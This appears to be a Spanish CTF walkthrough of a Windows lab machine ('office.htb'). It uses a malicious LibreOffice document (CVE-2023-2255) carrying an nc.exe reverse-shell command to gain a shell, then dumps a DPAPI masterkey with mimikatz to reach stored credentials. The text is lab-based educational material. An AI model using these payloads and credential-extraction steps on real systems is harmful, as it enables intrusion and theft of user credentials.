       <span class="k">if</span> <span class="o">(</span><span class="nv">$filesize</span> &lt; 5242880<span class="o">){</span>
	 <span class="nv">$ff</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$rewritefn</span><span class="s2">.</span><span class="nv">$extension</span><span class="s2">"</span><span class="p">;</span>
	 <span class="nv">$loc</span> <span class="o">=</span> <span class="s2">"applications/"</span>.<span class="nv">$ff</span><span class="p">;</span>
	   <span class="k">if</span><span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$filetmp</span>,<span class="nv">$loc</span><span class="o">))</span>
	   <span class="o">{</span>
	     // upload successful
	     <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;✔ Upload Successful!&lt;/span&gt;&lt;hr/&gt;&lt;style&gt;
	       button, input , select, option, h3{
			display:none;
		}
	       &lt;/style&gt;"</span><span class="p">;</span>
	 <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
<span class="nb">echo</span> <span class="nv">$loc</span><span class="p">;</span>
	 <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;✖️  Something Went Wrong! Unable To upload the Resume!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
	 <span class="o">}</span>

       <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
	
	 <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;⚠️  Your Resume should be less than 5MB!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
       <span class="o">}</span>

     <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
   <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;✖️  Corrupted File/Unable to Upload!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
     <span class="o">}</span>

   <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
   <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;❌ Accepted File Types : Doc, Docx, Docm, Odt!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
   <span class="o">}</span>
<span class="o">}</span>
?&gt;
&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
&lt;<span class="nb">head</span><span class="o">&gt;</span>
  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
	&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"shortcut icon"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png"</span><span class="o">&gt;</span>
  &lt;title&gt;Resume Submission&lt;/title&gt;
  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
body<span class="o">{</span>
height:100%<span class="p">;</span>
overflow:auto<span class="p">;</span>
<span class="o">}</span>
.notifi<span class="o">{</span>
font-weight:bold<span class="p">;</span>
padding:0px<span class="p">;</span>
<span class="o">}</span>
.notifi hr<span class="o">{</span>
background:#000000<span class="p">;</span>
height:2px<span class="p">;</span>
<span class="o">}</span>
.magic<span class="o">{</span>
margin-top:0.5%<span class="p">;</span>
max-height:90%<span class="p">;</span>
max-width:90%<span class="p">;</span>
border: 2px solid <span class="c">#000000;</span>
<span class="o">}</span>
.inpstylef<span class="o">{</span>
border-bottom: 2px solid <span class="c">#000000;</span>
padding:0.5%<span class="p">;</span>
font-size:14px<span class="p">;</span>
font-weight:bold<span class="p">;</span>
<span class="o">}</span>
.inputstyle ,.inpstyles <span class="o">{</span>
width:69%<span class="p">;</span>
height:35px<span class="p">;</span>
border:2px solid <span class="c">#000000;</span>
<span class="o">}</span>
.inpstylef::-webkit-file-upload-button <span class="o">{</span>
  visibility: hidden<span class="p">;</span>
<span class="o">}</span>
.inpstylef::before <span class="o">{</span>
  content: <span class="s1">'  '</span><span class="p">;</span>
  display: inline-block<span class="p">;</span>
  border: 1px solid <span class="c">#999;</span>
  border-radius: 3px<span class="p">;</span>
  padding: 5px 8px<span class="p">;</span>
  outline: none<span class="p">;</span>
  white-space: nowrap<span class="p">;</span>
  <span class="nt">-webkit-user-select</span>: none<span class="p">;</span>
  cursor: pointer<span class="p">;</span>
  text-shadow: 1px 1px <span class="c">#fff;</span>
  font-weight: 700<span class="p">;</span>
  font-size: 10pt<span class="p">;</span>
<span class="o">}</span>
::placeholder<span class="o">{</span>
color:#151715<span class="p">;</span>
opacity:1<span class="p">;</span>
font-weight:bold<span class="p">;</span>
<span class="o">}</span>
.magic h3<span class="o">{</span>
    text-align: left<span class="p">;</span>
    padding-left: 260px<span class="p">;</span>

<span class="o">}</span>
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;center&gt;
    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"magic"</span><span class="o">&gt;</span>
      &lt;h1&gt; Job Application Submission&lt;/h1&gt;
	&lt;hr <span class="nv">style</span><span class="o">=</span><span class="s2">"width:inherit;padding:0px;height:2px; background:#000000"</span>/&gt;
	&lt;span <span class="nv">class</span><span class="o">=</span><span class="s2">"notifi"</span><span class="o">&gt;</span>&lt;?php <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$notifi</span><span class="s2">"</span><span class="p">;</span> ?&gt;&lt;/span&gt;
      &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">""</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span><span class="o">&gt;</span>
        &lt;h3&gt;Full Name:&lt;/h3&gt;
        &lt;input <span class="nv">class</span><span class="o">=</span><span class="s2">"inputstyle"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"fullname"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"Example : John Doe"</span> required&gt;
        &lt;h3&gt;Email:&lt;/h3&gt;
        &lt;input <span class="nv">class</span><span class="o">=</span><span class="s2">"inputstyle"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"email"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"email"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">" Example : xxx123@xyz.abc"</span> required&gt;
        &lt;h3&gt;Work Experience&lt;/h3&gt;
        &lt;<span class="k">select </span><span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"background:#151715; color:#ffffff; font-weight:bold"</span>  <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyles"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"experience"</span> required&gt;
          &lt;option <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>0-5 years&lt;/option&gt;
          &lt;option <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>10-20 years&lt;/option&gt;
          &lt;option <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>20-30 years&lt;/option&gt;
	&lt;/select&gt;&lt;br/&gt;
	  &lt;h3&gt;Requested Salary&lt;/h3&gt;
        &lt;<span class="k">select </span><span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyles"</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"background:#151715; color:#ffffff; font-weight:bold"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"salary"</span> required&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"30 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>30 000<span class="nv">$&lt;</span>/option&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"60 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>60 000<span class="nv">$&lt;</span>/option&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"80 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>80 000<span class="nv">$&lt;</span>/option&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"100 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>100 000<span class="nv">$&lt;</span>/option&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"200 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>200 000<span class="nv">$&lt;</span>/option&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"300 000"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>300 000<span class="nv">$&lt;</span>/option&gt;
        &lt;/select&gt;&lt;br/&gt;&lt;br/&gt;
	 &lt;h3&gt;Choose Your Department&lt;/h3&gt;
        &lt;<span class="k">select </span><span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyles"</span><span class="nv">style</span><span class="o">=</span><span class="s2">"background:#151715; color:#ffffff; font-weight:bold"</span>  <span class="nv">name</span><span class="o">=</span><span class="s2">"department"</span> required&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"IT"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>IT&lt;/option&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"Sales"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>Sales&lt;/option&gt;
          &lt;option <span class="nv">value</span><span class="o">=</span><span class="s2">"Management"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstyl"</span><span class="o">&gt;</span>Management&lt;/option&gt;
        &lt;/select&gt;
        &lt;br&gt;
        &lt;br&gt;&lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"display:flex; flex-direction:column;  align-items: center;justify-content: center;"</span><span class="o">&gt;</span>
	 &lt;h3 <span class="nv">style</span><span class="o">=</span><span class="s2">"padding-left:50px"</span> <span class="o">&gt;</span>Upload Resume:&lt;/h3&gt;
        &lt;input <span class="nb">id</span><span class="o">=</span><span class="s2">""</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"inpstylef"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"file"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"assignment"</span><span class="o">&gt;</span>&lt;/div&gt;
        &lt;br&gt;
        &lt;br&gt;
        &lt;br&gt;
        &lt;button <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>Upload Resume&lt;/button&gt;
      &lt;/form&gt;
    &lt;/div&gt;
  &lt;/center&gt;

&lt;/body&gt;
&lt;/html&gt;

C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Nos dice que acepta archivos <code class="language-plaintext highlighter-rouge">docx, doc, odt y docm</code> ya que comprueba la extensión del archivo y los guarda dentro de applications.</p>
  </li>
  <li>
    <p>Si buscamos vulnerabilidades encontramos la siguiente <a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a>.</p>
  </li>
  <li>
    <p>Usa LibreOffice supongo que es el que abre el archivo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;dir <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files"</span>
<span class="nb">dir</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files"</span>
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is C626-9388

 Directory of C:<span class="se">\P</span>rogram Files

02/14/2024  03:18 AM    &lt;DIR&gt;          <span class="nb">.</span>
01/22/2024  10:58 AM    &lt;DIR&gt;          Common Files
01/25/2024  01:20 PM    &lt;DIR&gt;          Internet Explorer
01/17/2024  02:26 PM    &lt;DIR&gt;          LibreOffice 5
05/02/2023  05:22 PM    &lt;DIR&gt;          Microsoft OneDrive
05/08/2021  01:20 AM    &lt;DIR&gt;          ModifiableWindowsApps
04/14/2023  03:22 PM    &lt;DIR&gt;          Npcap
04/12/2023  04:30 PM    &lt;DIR&gt;          Oracle
02/14/2024  03:18 AM    &lt;DIR&gt;          VMware
04/17/2023  03:35 PM    &lt;DIR&gt;          Windows Defender
01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Mail
01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Media Player
05/08/2021  02:35 AM    &lt;DIR&gt;          Windows NT
03/02/2022  08:58 PM    &lt;DIR&gt;          Windows Photo Viewer
05/08/2021  01:34 AM    &lt;DIR&gt;          WindowsPowerShell
04/14/2023  03:23 PM    &lt;DIR&gt;          Wireshark
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
              17 Dir<span class="o">(</span>s<span class="o">)</span>   5,061,500,928 bytes free

C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;
</code></pre></div></div>

<ul>
  <li>Al parecer <a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a> nos genera un <code class="language-plaintext highlighter-rouge">odt</code> malicioso que podremos en applications.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/elweth-sec/CVE-2023-2255
❯ python3 CVE-2023-2255.py <span class="nt">-h</span>
usage: CVE-2023-2255.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="nt">--cmd</span> CMD <span class="o">[</span><span class="nt">--output</span> OUTPUT]

CVE-2023-2255

options:
  <span class="nt">-h</span>, <span class="nt">--help</span>       show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">--cmd</span> CMD        Command to execute
  <span class="nt">--output</span> OUTPUT  Output filename
</code></pre></div></div>

<ul>
  <li>Vamos a generar el <code class="language-plaintext highlighter-rouge">.odt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 CVE-2023-2255.py <span class="nt">--cmd</span> <span class="s1">'C:\xampp\htdocs\joomla\templates\cassiopeia\nc.exe 10.10.14.74 4949 -e cmd.exe '</span> <span class="nt">--output</span> yiyi.odt
File yiyi.odt has been created <span class="o">!</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4949
listening on <span class="o">[</span>any] 4949 ...
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora dentro de la carpeta applications vamos a poner el <code class="language-plaintext highlighter-rouge">.odt</code>.</p>
  </li>
  <li>
    <p>Todo esto como el usuario web_account ya que ese usuario tiene privilegios de lectura en ese directorio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;icacls applications
icacls applications
applications CREATOR OWNER:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
             OFFICE<span class="se">\P</span>Potts:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>NP<span class="o">)(</span>F<span class="o">)</span>
             NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
             NT AUTHORITY<span class="se">\L</span>OCAL SERVICE:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
             OFFICE<span class="se">\w</span>eb_account:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX,W<span class="o">)</span>
             BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
             BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>

Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal<span class="se">\a</span>pplications&gt;curl http://10.10.14.74:8080/yiyi.odt <span class="nt">-o</span> yiyi.odt
curl http://10.10.14.74:8080/yiyi.odt <span class="nt">-o</span> yiyi.odt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 30567  100 30567    0     0  91336      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 91792
</code></pre></div></div>

<ul>
  <li>Ahora después de esperar nos llega la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4949
listening on <span class="o">[</span>any] 4949 ...
connect to <span class="o">[</span>10.10.14.74] from office.htb <span class="o">[</span>10.10.11.3] 58419
Microsoft Windows <span class="o">[</span>Version 10.0.20348.2322]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;whoami
<span class="nb">whoami
</span>office<span class="se">\p</span>potts

C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;
</code></pre></div></div>

<h2 id="shell-as-hhogan">Shell as hhogan</h2>

<ul>
  <li>Vemos que el usuario actual tiene las credenciales de hhogan almacenadas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target<span class="o">=</span>MyTarget
    Type: Generic
    User: MyUser

    Target: Domain:interactive<span class="o">=</span>office<span class="se">\h</span>hogan
    Type: Domain Password
    User: office<span class="se">\h</span>hogan
</code></pre></div></div>

<ul>
  <li>El usuario forma parte del grupo Remote Management Users así que podremos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;net user hhogan
net user hhogan
User name                    HHogan
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 5:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>
    <p>Podemos usar <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> para ver las credenciales pero el archivo donde estan guardadas las credenciales y el SID del usuario.</p>
  </li>
  <li>
    <p>Comenzamos viendo el SID.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files<span class="se">\L</span>ibreOffice 5<span class="se">\p</span>rogram&gt;whoami /all
<span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name     SID
<span class="o">=============</span> <span class="o">=============================================</span>
office<span class="se">\p</span>potts S-1-5-21-1199398058-4196589450-691661856-1107
</code></pre></div></div>

<ul>
  <li>Vemos los archivos donde se almacenan credenciales cifradas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts&gt; gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials
gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials


    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a-hs-</span>          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
<span class="nt">-a-hs-</span>          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
<span class="nt">-a-hs-</span>         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
</code></pre></div></div>

<ul>
  <li>Podemos ver los nombres.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts&gt; gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect
gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect


    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
<span class="nt">-a-hs-</span>          5/2/2023   4:13 PM             24 CREDHIST
<span class="nt">-a-hs-</span>         1/17/2024   4:06 PM             76 SYNCHIST


PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts&gt; gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span><span class="nt">-1-5-21-1199398058-4196589450-691661856-1107</span>
gci <span class="nt">-force</span> AppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span><span class="nt">-1-5-21-1199398058-4196589450-691661856-1107</span>


    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span><span class="nt">-1-5-21-1199398058-4196589450-691661856-1107</span>


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a-hs-</span>         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
<span class="nt">-a-hs-</span>          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
<span class="nt">-a-hs-</span>         7/19/2024  12:44 AM            740 436aa19c-a54f-4fd5-b6db-c9faef682d27
<span class="nt">-a-hs-</span>          5/2/2023   4:13 PM            900 BK-OFFICE
<span class="nt">-a-hs-</span>         7/19/2024  12:44 AM             24 Preferred
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos usar RPC <a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</a>.</p>
  </li>
  <li>
    <p>Tenemos la master key.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\D</span>ownloads&gt; .<span class="se">\m</span>imikatz.exe
.<span class="se">\m</span>imikatz.exe

  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c">#18362 Feb 29 2020 11:13:36</span>
 .## ^ <span class="c">##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="c">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="s1">'## v ##'</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
  <span class="s1">'#####'</span>        <span class="o">&gt;</span> http://pingcastle.com / http://mysmartlogon.com   <span class="k">***</span>/

mimikatz <span class="c"># dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc</span>
<span class="k">**</span>MASTERKEYS<span class="k">**</span>
  dwVersion          : 00000002 - 2
  szGuid             : <span class="o">{</span>191d3f9d-7959-4b4d-a520-a444853c47eb<span class="o">}</span>
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
<span class="o">[</span>masterkey]
  <span class="k">**</span>MASTERKEY<span class="k">**</span>
    dwVersion        : 00000002 - 2
    salt             : c521daa0857ee4fa6e4246266081e94c
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 <span class="o">(</span>CALG_HMAC<span class="o">)</span>
    algCrypt         : 00006603 - 26115 <span class="o">(</span>CALG_3DES<span class="o">)</span>
    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f

<span class="o">[</span>backupkey]
  <span class="k">**</span>MASTERKEY<span class="k">**</span>
    dwVersion        : 00000002 - 2
    salt             : a2741b13d7261697be4241ebbe05098a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 <span class="o">(</span>CALG_HMAC<span class="o">)</span>
    algCrypt         : 00006603 - 26115 <span class="o">(</span>CALG_3DES<span class="o">)</span>
    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209

<span class="o">[</span>domainkey]
  <span class="k">**</span>DOMAINKEY<span class="k">**</span>
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : <span class="o">{</span>e523832a-e126-4d6e-ac04-ed10da72b32f<span class="o">}</span>
    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665


Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107

<span class="o">[</span>domainkey] with RPC
<span class="o">[</span>DC] <span class="s1">'office.htb'</span> will be the domain
<span class="o">[</span>DC] <span class="s1">'DC.office.htb'</span> will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
</code></pre></div></div>

<ul>
  <li>Si recordamos hay 3 creds encrypted.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>Potts<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
